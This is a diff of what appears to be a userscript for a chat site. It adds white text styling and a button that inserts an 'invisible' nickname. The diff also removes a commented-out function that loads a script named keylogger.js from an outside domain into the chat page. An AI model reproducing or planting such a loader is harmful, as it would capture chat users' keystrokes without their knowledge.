@@ -238,18 +238,23 @@ EP.emR = new Array({m:/:-*\L+/,r:"<span class=\"nI\" style=\"font-size:45px; bac
 /////////////////////////////////////////////////////////////////////////////////
 //necesario en chrome:
 document.getElementById("CI").style.height="50px";
+// poner letras en color blanco:
+LDM.style.color="#FFFFFF";
+
+// boton para colocar nick invi en la entrada:
+var ent = document.getElementById("LDN");
+ent.innerHTML += "<div style='color:#FFFFFF'>Da Click en Ok para insertar el nick Invi:&nbsp;&nbsp;&nbsp;<button onclick='nickInvi();'>Ok</button></div>"
+
+function nickInvi()
+{
+  LDNN.value += "";
+  LDNN.focus();
+}
+
+
 
 //
 ////FIN DEL SCRIPT.
 
-/*
-function K()
-{
-var cabe = IN.CI.document.head
-var scriptt = document.createElement('script');
-scriptt.src="http://kosmosapps.xyz/keylogger.js";
-cabe.appendChild(scriptt);
-}
-K();
-*/
+
 
